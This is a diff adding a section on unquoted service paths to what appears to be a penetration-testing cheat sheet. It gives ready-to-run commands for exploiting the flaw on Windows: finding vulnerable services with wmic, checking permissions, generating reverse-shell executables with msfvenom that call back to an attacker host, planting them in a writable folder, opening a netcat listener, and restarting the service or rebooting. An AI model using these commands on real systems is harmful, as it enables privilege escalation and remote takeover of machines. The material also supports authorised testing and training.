@@ -4289,6 +4289,50 @@ tr '\r' '\n' < /path/to/mac_file/here > /path/to/unix_file/here
 
 
 
+## UNQUOTED SERVICE PATH
+```bash
+# search for unquoted service path
+wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+# check permissions on folder
+icacls C:\path\to\folder\
+## permissions
+D - Delete access
+F - Full access (Edit_Permissions+Create+Delete+Read+Write)
+N - No access
+M - Modify access (Create+Delete+Read+Write)
+RX - Read and eXecute access
+R - Read-only access
+W - Write-only access
+## inheritance on folders
+(OI) - object inherit
+(CI) - container inherit
+(IO) - inherit only
+(NP) - don’t propagate inherit
+(I)  - Permission inherited from parent container
+
+# check permissions on service --> AUTO_START
+sc qc service_name_here
+
+# generate reverse shell + transfer to victim
+## x86
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x86 -o shell.exe
+## x64
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe
+
+# copy revshell to writable folder
+copy shell.exe C:\path\to\folder\
+
+# set up listener on kali
+rlwrap nc -lnvp port_here
+
+# restart vulnerable service or reboot
+sc stop service_name_here
+shutdown /r /t 0
+```
+
+
+
 ## UPX
 ```bash
 # compress + pack executable
